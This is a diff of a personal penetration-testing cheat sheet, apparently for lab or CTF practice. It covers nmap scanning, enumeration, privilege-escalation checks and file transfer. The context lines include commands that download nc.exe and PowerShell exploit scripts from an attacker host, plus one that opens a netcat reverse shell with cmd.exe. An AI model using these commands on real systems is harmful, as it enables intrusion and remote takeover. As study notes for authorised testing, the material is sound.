@@ -16,11 +16,14 @@
   - sudo nmap -p- -Pn -sS TARGET -oA AllPort
   - sudo nmap -p -Pn -A 10.10.43.161 -oA Services
   - sudo nmap -Pn -sV -sS -p --script vuln $target -oN Vuln.txt
-    - sudo nmap -p445 --script=smb-enum-shares.nse,smb-enum-users.nse $target
-  - -v Version
-  - -A os, in-build scripts
-  - -sC default scripts
-  - **extract ports**: sudo nmap -Pn -p- -T4 $target -oN ports.txt | egrep "^[0-9]{2,5}"  | sed -E "s#/.*##g" | tr "\n" ","
+    - -v Version
+    - -A os, in-build scripts
+    - -sC default scripts
+
+  - scripts
+    -   --script=nfs-ls,nfs-statfs,nfs-showmount
+    -   --script=smb-enum-shares.nse,smb-enum-users.nse
+
     -  ports=$(sudo nmap -Pn -T4 $target -oN ports.txt | egrep "^[0-9]{2,5}" | sed -E "s#/.*##g" | tr "\n" "," | sed 's/.$//') && echo $ports
 
 ### DNS
@@ -44,9 +47,6 @@
 - dnsrecon -d DOMAIN -std
 
 
-- nmap Scrips
-  - locate -r nse$ | grep mysql = nmap script
-
 ## Login
 - brute force: hydra
 - sqlmap
@@ -55,10 +55,11 @@
 - [Good advices](https://nored0x.github.io/red-teaming/windows-enumeration/)
 - whoami /priv
 - systeminfo
-- smb read/write
-  - --script=smb-enum-shares.nse,smb-enum-users.nse
-- mount:
-  - --script=nfs-ls,nfs-statfs,nfs-showmount
+  - architecture 
+    - [Environment]::Is64BitProcess
+    - [Environment]::Is32itProcess
+- Impackt
+  - /opt/impacket/e
 - browser cache
 - Enumerate register
 - scheduled task
@@ -111,8 +112,7 @@
 - sudo -l
 - find / -perm -u=s -type f 2>/dev/null
 - find / -type f -perm -04000 -ls 2>/dev/null : SUID
-- psexec.py
-- LinEnum.sh + LinPeas
+
 - lscpu
 - lsblk -a
 - lsusb -v
@@ -120,6 +120,10 @@
 - fidlist -l
 - Groups: LXD????
 - crontab
+- Automatic tools
+  - LinEnum.sh 
+  - LinPeas
+  - psexec.py
   
 - Shell stabilize
   - python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -139,10 +143,7 @@
 - powershell -c wget http://10.9.1.255:8080/nc.exe -outfile "nc.exe"
 - certutil -urlcache -f http://$attacking:80/nc.exe nc.exe
 - iex(New-Object Net.WebClient).DownloadString('http://$attacking:PORT/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
-     __ __ ___ ___   ___     ___ ___ ___ 
-    |
 
-  
 ### Linux
 - wget attacker-machine:8000:file.ext
 - curl attacker-machine:8000:file.ext
